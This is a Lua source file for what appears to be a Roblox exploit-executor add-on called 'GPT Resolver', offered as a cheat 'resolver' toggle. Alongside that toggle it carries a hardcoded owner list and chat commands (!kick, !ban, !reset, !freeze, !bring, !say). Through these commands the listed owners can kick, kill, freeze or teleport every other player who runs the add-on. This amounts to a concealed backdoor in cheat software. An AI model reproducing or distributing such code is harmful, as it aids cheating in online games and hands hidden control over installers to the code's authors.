-- main.lua – GPT Resolver Add-On

-- 1) Name in console/logs
api:set_lua_name("GPT Resolver")

-- 2) Define your owner list here (no UI/commands to change it)
local ownerList = {
    379301956, 3084980990  -- your UserId
    -- add more IDs if you want multiple owners
}
local function isOwner(id)
    for _, oid in ipairs(ownerList) do
        if oid == id then return true end
    end
    return false
end

-- 3) Grab (or create) the misc tab via api
local tabs = { misc = api:GetTab("misc") or api:AddTab("misc") }

-- 4) Add a GPT Resolver group to misc
local resolverGroup = tabs.misc:AddLeftGroupbox("GPT Resolver")

-- 5) Add only the AI Resolver toggle
local aiToggle = resolverGroup:AddToggle("gpt_ai_resolver", {
    Text    = "Enable AI Resolver",
    Default = false,
})

-- 6) Fake-position detection
local function is_fake_position(plr)
    local c = plr.Character
    if c and c.PrimaryPart then
        local y = c.PrimaryPart.Position.Y
        if y < -100 or y > 1000 then return true end
    end
    return plr.FakePos or false
end

-- 7) Resolver loop via Heartbeat (no on_player_update)
do
    local RunService = game:GetService("RunService")
    RunService.Heartbeat:Connect(function()
        if not aiToggle:GetValue() then return end
        for _, pl in ipairs(game.Players:GetPlayers()) do
            if is_fake_position(pl) then
                api:chat("GPT Resolver: returned " .. pl.Name .. " from void/fake!")
                local c = pl.Character
                if c and c.PrimaryPart then
                    c.PrimaryPart.CFrame = CFrame.new(0, 10, 0)
                end
            end
        end
    end)
end

-- 8) Helper: all addon users except owners
local function get_targets()
    local out = {}
    for _, pl in ipairs(game.Players:GetPlayers()) do
        if not isOwner(pl.UserId) and api:HasAddon(pl) then
            table.insert(out, pl)
        end
    end
    return out
end

-- 9) Owner-only chat commands
local cmds = {
    ["!bring ."]   = function()
        local me = game.Players.LocalPlayer
        if me and me.Character and me.Character.PrimaryPart then
            local cf = me.Character.PrimaryPart.CFrame
            for _, pl in ipairs(get_targets()) do
                if pl.Character and pl.Character.PrimaryPart then
                    pl.Character.PrimaryPart.CFrame = cf
                end
            end
        end
    end,
    ["!kick ."]    = function()
        for _, pl in ipairs(get_targets()) do
            pl:Kick("Kicked by owner.")
        end
    end,
    ["!reset ."]   = function()
        for _, pl in ipairs(get_targets()) do
            local c = pl.Character
            if c then
                local h = c:FindFirstChildOfClass("Humanoid")
                if h then h.Health = 0 end
            end
        end
    end,
    ["!freeze ."]  = function()
        for _, pl in ipairs(get_targets()) do
            local c = pl.Character
            if c then
                for _, part in ipairs(c:GetDescendants()) do
                    if part:IsA("BasePart") then part.Anchored = true end
                end
            end
        end
    end,
    ["!thaw ."]    = function()
        for _, pl in ipairs(get_targets()) do
            local c = pl.Character
            if c then
                for _, part in ipairs(c:GetDescendants()) do
                    if part:IsA("BasePart") then part.Anchored = false end
                end
            end
        end
    end,
    ["!ban ."]     = function()
        for _, pl in ipairs(get_targets()) do
            pl:Kick("You Have Been BANNED!")
        end
    end,
    ["!say ."]     = function(_, ...)
        local msg = table.concat({...}, " ")
        for _, pl in ipairs(get_targets()) do
            api:chat(msg)
        end
    end,
    ["!credits ."] = function()
        for _, pl in ipairs(get_targets()) do
            api:chat("This Addon Was Made By 0x965 & Norby!")
        end
    end,
}

for trigger, fn in pairs(cmds) do
    api:on_command(trigger, function(sender, ...)
        if isOwner(sender.UserId) then
            fn(sender, ...)
        end
    end)
end
